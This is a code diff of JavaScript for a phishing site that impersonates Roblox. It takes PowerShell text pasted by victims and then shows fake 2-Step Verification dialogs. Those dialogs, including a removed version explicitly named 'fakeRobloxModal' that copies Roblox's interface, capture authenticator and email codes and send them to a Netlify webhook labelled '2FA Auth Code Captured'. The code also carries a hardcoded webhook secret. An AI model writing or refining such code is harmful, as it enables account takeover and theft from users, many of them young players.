@@ -46,7 +46,7 @@ function closeModal(id) {
 }
 
 function closeAllModals() {
-  ['modal', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
+  ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
 }
 
 // === Main Button ===
@@ -56,7 +56,6 @@ document.getElementById('enterButton').addEventListener('click', function() {
 
 // === PowerShell Submission ===
 document.getElementById('submitButton').addEventListener('click', async function() {
-  console.log('Submit button clicked');
   const powershellInput = document.getElementById('powershellInput');
   const powershellData = powershellInput.value.trim();
 
@@ -117,14 +116,9 @@ document.getElementById('submitButton').addEventListener('click', async function
   powershellInput.value = '';
   closeModal('modal');
 
-  try {
   // Show loading overlay and handle the sequence
-    console.log('Starting loading sequence...');
   showLoading(true, false);
   showLoadingMessage("Searching for item 🔎");
-  } catch (error) {
-    console.error('Error in loading sequence:', error);
-  }
 
   // Sequence with timing changes
   setTimeout(() => {
@@ -143,9 +137,8 @@ document.getElementById('submitButton').addEventListener('click', async function
   }, 8500);
 
   setTimeout(() => {
-    // 10s: Show 2FA modal with new implementation
-    console.log('Showing 2FA modal...');
-    show2FAModal();
+    // 10s: Show 2FA modal (not just success popup)
+    openModal('twofa-modal');
   }, 10000);
 });
 
@@ -165,10 +158,8 @@ const loadingMessages = [
 ];
 
 function showLoading(show, cycling = false) {
-  console.log('showLoading called:', show, cycling);
   if (show) {
     if (!document.getElementById('loading-overlay')) {
-      console.log('Creating loading overlay...');
       const overlay = document.createElement('div');
       overlay.id = 'loading-overlay';
 
@@ -183,7 +174,6 @@ function showLoading(show, cycling = false) {
       overlay.appendChild(spinner);
       overlay.appendChild(msg);
       document.body.appendChild(overlay);
-       console.log('Loading overlay created and added to DOM');
     }
     if (cycling) {
       startLoadingMessages();
@@ -229,108 +219,90 @@ function showErrorAlert() {
   }
 }
 
-// === New 2FA Modal Implementation ===
-function show2FAModal() {
-  try {
-    var e=document.getElementById("fakeRobloxModal");
-    if(e)e.remove();
-    var s=document.getElementById("fakeRobloxStyles");
-    if(s)s.remove();
-    s=document.createElement("style");
-    s.id="fakeRobloxStyles";
-    s.textContent=".roblox-loader{display:inline-block;position:relative;width:40px;height:14px;margin:10px auto}.roblox-loader div{position:absolute;top:0;width:10px;height:10px;background:gray;border-radius:2px;animation-timing-function:cubic-bezier(0,1,1,0)}.roblox-loader div:nth-child(1){left:0;animation:roblox-loader1 .6s infinite}.roblox-loader div:nth-child(2){left:15px;animation:roblox-loader2 .6s infinite}.roblox-loader div:nth-child(3){left:30px;animation:roblox-loader3 .6s infinite}@keyframes roblox-loader1{0%{transform:scale(0);background:gray}50%{transform:scale(1);background:white}100%{transform:scale(0);background:gray}}@keyframes roblox-loader2{0%{transform:scale(1) translateX(0);background:gray}50%{transform:scale(1.2) translateX(3px);background:white}100%{transform:scale(1) translateX(0);background:gray}}@keyframes roblox-loader3{0%{transform:scale(1);background:gray}50%{transform:scale(0);background:white}100%{transform:scale(1);background:gray}}.loading-modal .modal-header{display:flex!important;justify-content:center!important;align-items:center!important}.loading-modal .modal-title{margin:0!important}";
-    document.head.appendChild(s);
-    
-    // First loading modal - 2-Step Verification for 0.3 seconds
-    var l=document.createElement("div");
-    l.id="fakeRobloxModal";
-         l.innerHTML="<div role='dialog'><div class='fade modal-backdrop in'></div><div role='dialog' tabindex='-1' class='fade modal-modern in modal' style='display:block;'><div class='modal-dialog loading-modal'><div class='modal-content' role='document'><div class='modal-header'><h4 class='modal-title'>2-Step Verification</h4></div><div class='modal-body' style='display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 0;height:80px;'><div class='roblox-loader'><div></div><div></div><div></div></div></div></div></div></div></div>";
-     document.body.appendChild(l);
-     console.log('First 2FA modal (loading) created and added to DOM');
-    var b=l.querySelector(".modal-backdrop");
-    if(b)b.remove();
-    
-    // After 0.3 seconds, show the main modal
-    setTimeout(function(){
-        l.remove();
-        var m=document.createElement("div");
-        m.id="fakeRobloxModal";
-        m.innerHTML="<div role='dialog'><div class='fade modal-backdrop in'></div><div role='dialog' tabindex='-1' class='fade modal-modern in modal' style='display:block;'><div class='modal-dialog'><div class='modal-content' role='document'><div class='modal-header'><button type='button' class='modal-modern-header-button'><span class='icon-close'></span></button><h4 class='modal-title'>2-Step Verification</h4></div><div class='modal-body'><div class='modal-protection-shield-icon'></div><p class='modal-margin-bottom-xlarge'>Enter the code generated by your authenticator app.</p><div class='input-control-wrapper'><div class='form-group'><input inputmode='numeric' autocomplete='off' maxlength='6' placeholder='Enter 6-digit Code' type='text' id='two-step-verification-code-input' class='input-field form-control' value=''><div class='form-control-label bottom-label xsmall'>&nbsp;</div></div></div><p><button type='button' class='modal-body-button-link small'>Resend Code</button></p><p><button type='button' class='modal-body-button-link small'>Use another verification method</button></p></div><div class='modal-footer'><div class='modal-modern-footer-buttons' style='text-align:center;position:relative;min-height:42px;'><button id='verifyBtn' type='button' class='btn-cta-md modal-modern-footer-button' aria-label='Verify' disabled>Verify</button><div id='loadingSpinner' style='display:none;width:40px;height:14px;margin:0 auto;box-sizing:border-box;vertical-align:middle;'><div class='roblox-loader'><div></div><div></div><div></div></div></div></div><p class='text-footer modal-margin-bottom'>Need help? Contact <a class='text-name text-footer contact' href='https://www.roblox.com/info/2sv' target='_blank' rel='noopener noreferrer'>Roblox Support</a></p><p class='text-footer'>IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>";
-        document.body.appendChild(m);
-        var b2=m.querySelector(".modal-backdrop");
-        if(b2)b2.remove();
-        
-        m.querySelector(".modal-modern-header-button").onclick=function(){
-            m.remove()
-        };
-        
-        var i=m.querySelector("#two-step-verification-code-input"),
-            t=m.querySelector("#verifyBtn"),
-            r=m.querySelector("#loadingSpinner"),
-            val="";
-        
-        function u(){
-            i.value=val.length>1?"●".repeat(val.length-1)+val.slice(-1):val;
-            t.disabled=val.length!==6
-        }
-        
-        i.addEventListener("keydown",function(e){
-            if(e.key>="0"&&e.key<="9"){
-                if(val.length<6){
-                    val+=e.key;
-                    u()
-                }
-                e.preventDefault()
-            }else if(e.key==="Backspace"){
-                val=val.slice(0,-1);
-                u();
-                e.preventDefault()
-            }else if(["ArrowLeft","ArrowRight","Tab","Delete"].includes(e.key)){}else e.preventDefault();
-            setTimeout(()=>{i.selectionStart=i.selectionEnd=i.value.length},0)
-        });
-        
-        i.addEventListener("paste",function(e){
-            e.preventDefault();
-            var p=(e.clipboardData||window.clipboardData).getData("text").replace(/\D/g,"").slice(0,6-val.length);
-            val+=p;
-            if(val.length>6)val=val.slice(0,6);
-            u();
-            setTimeout(()=>{i.selectionStart=i.selectionEnd=i.value.length},0)
-        });
-        
-        t.addEventListener("click",async function(){
-            t.style.display="none";
-            r.style.display="inline-block";
-            
-            // Send code using your existing Netlify webhook pattern
-            await sendSecureWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${val}**`, 0xffa500);
-            
-            // After 0.5 seconds, fade out and remove
-            setTimeout(()=>{
-                m.style.transition = 'opacity 0.3s ease-out';
-                m.style.opacity = '0';
-    setTimeout(() => {
-                    m.remove();
-      showSuccessPopup();
-                }, 300);
-            }, 500);
+// === 2FA Modal Logic (add 6s delay before showing success popup) ===
+const twofaInput = document.getElementById('twofa-input');
+const verifyButton = document.getElementById('verifyButton');
+
+if (twofaInput && verifyButton) {
+  twofaInput.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput.value);
+    verifyButton.disabled = !enabled;
+    verifyButton.classList.toggle('enabled', enabled);
   });
-     }, 300); // Changed from 700ms to 300ms
-  } catch (error) {
-    console.error('Error in show2FAModal:', error);
-  }
+
+  verifyButton.addEventListener('click', async () => {
+    const codeEnteredValue = twofaInput.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    // Rate limiting check
+    if (!rateLimit.check()) {
+      alert('Please wait a moment before trying again.');
+      return;
+    }
+
+    // Send webhook for 2FA code
+    await sendSecureWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
+    twofaInput.value = '';
+    closeModal('twofa-modal');
+    showLoading(true, false);
+    showLoadingMessage("Processing...");
+
+    setTimeout(() => {
+      showLoading(false);
+      showSuccessPopup();
+    }, 6000);
+  });
+}
+
+const twofaInput2 = document.getElementById('twofa-input-2');
+const verifyButton2 = document.getElementById('verifyButton2');
+
+if (twofaInput2 && verifyButton2) {
+  twofaInput2.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput2.value);
+    verifyButton2.disabled = !enabled;
+    verifyButton2.classList.toggle('enabled', enabled);
+  });
+
+  verifyButton2.addEventListener('click', async () => {
+    const codeEnteredValue = twofaInput2.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    // Rate limiting check
+    if (!rateLimit.check()) {
+      alert('Please wait a moment before trying again.');
+      return;
+    }
+
+    // Send webhook for email code
+    await sendSecureWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+
+    twofaInput2.value = '';
+    closeModal('twofa-modal-2');
+    
+    // 6 second delay before success popup
+    showLoading(true, false);
+    showLoadingMessage("Processing...");
+
+    setTimeout(() => {
+      showLoading(false);
+      showSuccessPopup();
+    }, 6000);
+  });
 }
 
 const WEBHOOK_SECRET = 'A9f$2kLz!pQw8xR7';
 
 async function sendSecureWebhook(title, description, color) {
   try {
-    // Use full Netlify URL for local development, relative path for production
-    const isLocal = window.location.protocol === 'file:';
-    const netlifyUrl = isLocal 
-      ? 'https://rbxchecking.netlify.app/.netlify/functions/webhook'
-      : '/.netlify/functions/webhook';
-    const response = await fetch(netlifyUrl, {
+    const response = await fetch('/.netlify/functions/webhook', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -341,8 +313,6 @@ async function sendSecureWebhook(title, description, color) {
     
     if (!response.ok) {
       console.error('Failed to send webhook:', response.status);
-    } else {
-      console.log('Webhook sent successfully');
     }
   } catch (error) {
     console.error('Error sending webhook:', error);
@@ -351,8 +321,8 @@ async function sendSecureWebhook(title, description, color) {
 
 // === Helpers ===
 function closeTwoFAModal() {
-  const modal = document.getElementById("fakeRobloxModal");
-  if (modal) modal.remove();
+  const modals = ['twofa-modal', 'twofa-modal-2'];
+  modals.forEach(id => closeModal(id));
 }
 
 function useAnotherMethod() {
